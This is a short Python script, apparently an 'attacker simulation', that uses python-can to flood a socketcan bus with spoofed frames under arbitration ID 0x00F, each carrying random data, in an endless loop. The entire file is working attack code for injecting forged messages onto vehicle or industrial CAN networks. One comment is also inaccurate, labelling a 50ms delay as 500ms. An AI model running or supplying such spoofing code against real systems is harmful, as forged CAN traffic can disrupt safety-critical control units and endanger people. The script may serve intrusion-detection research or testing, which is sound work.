import can
import time
import random  # Import the random module

# Configuration
CAN_INTERFACE = 'can0'
SPOOFED_ID = 0x00F  # The ID the attacker is spoofing
BUS_TYPE = 'socketcan'   # Adjust based on your platform

# Initialize CAN bus
bus = can.interface.Bus(interface=BUS_TYPE, channel=CAN_INTERFACE, bitrate=400000)

def send_spoofed_message():
    """Send a spoofed CAN message with random data."""
    # Generate a list of 8 random bytes for the data field
    SPOOFED_DATA = [random.randint(0x00, 0xFF) for _ in range(8)]
    msg = can.Message(arbitration_id=SPOOFED_ID, data=bytearray(SPOOFED_DATA), is_extended_id=False)
    try:
        bus.send(msg)
        print(f"Sent spoofed message with ID: {hex(SPOOFED_ID)}, Data: {[hex(byte) for byte in SPOOFED_DATA]}")
    except can.CanError:
        print("Failed to send spoofed message")

if __name__ == "__main__":
    try:
        print("Attacker simulation started")
        while True:
            send_spoofed_message()
            time.sleep(0.05)  # Send a spoofed message every 500ms (adjust as needed)
    except KeyboardInterrupt:
        print("Exiting attacker simulation...")
        bus.shutdown()